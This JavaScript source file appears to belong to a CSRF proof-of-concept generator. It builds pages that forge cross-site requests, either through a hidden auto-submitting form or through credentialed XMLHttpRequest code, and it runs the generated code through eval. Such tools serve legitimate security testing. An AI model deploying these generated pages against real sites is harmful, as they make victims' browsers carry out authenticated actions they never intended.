var formfunc = {
    generate: function (httpRequest) {
        var req = httpRequest.line;
        if (req === false)
            return false;
        req['enctype'] = form.getEnctype();
        var ezhtml = "";
        var transsub = "";
        if (!form.isTransitionSubmit())
            transsub = 'target="dummyfrm"';
        ezhtml += "<form " + transsub + " name=\"evilform\" action=\"" + req['url'] + "\" method=\"" + req['method'] + "\" enctype=\"" + req['enctype'] + "\">\n";
        var params = httpRequest.body;
        for (var i = 0; i < params.length; i++) {
            ezhtml += HTMLRender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!form.isAutoSubmit() && form.isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
        }
        ezhtml += "</form>\n<iframe src=\"x\" width=\"1\" height=\"1\" name=\"dummyfrm\" style=\"visibility:hidden\"></iframe>";
        setEvilHTMLContent(ezhtml);
        setEvilTextContent(ezhtml);
        errorMsg("");
        return true;
    },
    generateHTML: function (title, bodyhtml) {
        var content = getHTMLheader(title) + "\n<body" + ((form.isAutoSubmit()) ? ' onload="csrfSubmit();"' : '') + ">\n" + bodyhtml + ((!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : '') + "\n" + this.generateSendFunction() + "\n<p>" + title + "</p>\n" + getHTMLfooter() + "\n";
        return content;
    },
    send: function (httprequest) {
        var req = httprequest;
        if (form.isTransitionSubmit()) {
            errorMsg("Cannot submit because \"transition on submit\" is on!");
            return false;
        }
        if (!isValidURL(req.line['url'])) {
            errorMsg("The URL is malformed");
            return false;
        }
        document.getElementById("stat").innerHTML += "<p>" + new Date().toLocaleString() + " Request sent.</p><p>" + escapeHTML(req.line['url']) + "</p><p>" + escapeHTML(req.rawBody) + "</p><hr />";
        // @ts-ignore
        var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
        submit(); // submit request.
        errorMsg("");
        return true;
    },
    generateSendFunction: function () {
        var content = "<script>\nfunction csrfSubmit(){\n    let submit = HTMLFormElement.prototype[\"submit\"].bind(document.evilform);\n    submit();\n}\n</script>\n";
        return content;
    }
};
var xhrfunc = {
    generate: function (httpRequest) {
        var req = httpRequest.line;
        var enctype = HTTPRequest.buildHeaderOption(httpRequest.enctype);
        var headers = httpRequest.header;
        var sendMessage = (form.isFromCharCode() ? toFromCharCodes(form.getBody()) : "'" + escapeJavascript(form.getBody()) + "'");
        var ezhtml = "function csrfSubmit(){\nlet xhr=new XMLHttpRequest();\nxhr.open('" + req['method'] + "','" + req['url'] + "');\nxhr.withCredentials = true;\n";
        var hc = headers['custom'];
        for (var i = 0; i < hc.length; i++) {
            ezhtml += "xhr.setRequestHeader('" + hc[i][0] + "','" + HTTPRequest.buildHeaderOption(hc[i][1]) + "');\n";
        }
        if (enctype !== '')
            ezhtml += "xhr.setRequestHeader('Content-Type','" + enctype + "')\n        ";
        ezhtml += "xhr.send(" + sendMessage + ");\n}\n";
        setEvilTextContent(ezhtml, true);
        setEvilHTMLContent(ezhtml);
        return true;
    },
    generateHTML: function (title, bodyhtml) {
        var content = getHTMLheader(title) + "\n<body" + ((form.isAutoSubmit()) ? ' onload="csrfSubmit();"' : '') + ">\n" + bodyhtml + ((!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : '') + "\n<p>" + title + "</p>\n" + getHTMLfooter() + "\n";
        return content;
    },
    send: function () {
        eval(document.getElementById("evilzone").textContent);
        // @ts-ignore
        csrfSubmit();
    }
};
function getHTMLheader(title) {
    if (title === void 0) { title = "CSRF PoC"; }
    var content = "<!DOCTYPE html>\n\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>" + title + "</title>\n</head>\n";
    return content;
}
function getHTMLfooter() {
    var content = '</html>\n';
    return content;
}
//# sourceMappingURL=sendfunc.js.map